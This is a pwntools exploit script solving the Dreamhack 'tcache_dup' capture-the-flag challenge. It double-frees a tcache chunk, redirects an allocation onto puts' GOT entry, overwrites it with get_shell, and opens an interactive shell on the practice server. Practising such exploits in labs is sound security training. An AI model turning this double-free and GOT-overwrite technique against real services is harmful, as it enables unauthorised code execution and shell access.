from pwn import *

p = remote("host3.dreamhack.games", 24416)
e = ELF("./tcache_dup")

get_shell = e.symbols['get_shell']
puts_got = e.got['puts']


def create(size, data):
	p.sendlineafter("> ", '1')
	p.sendlineafter("Size: ", str(size))
	p.sendlineafter("Data: ", data)


def delete(idx):
	p.sendlineafter("> ", '2')
	p.sendlineafter("idx: ", str(idx))


create(0x18, 'a')
delete(0)
delete(0)

create(0x18, p64(puts_got))
create(0x18, 'a')
create(0x18, p64(get_shell))

p.interactive()

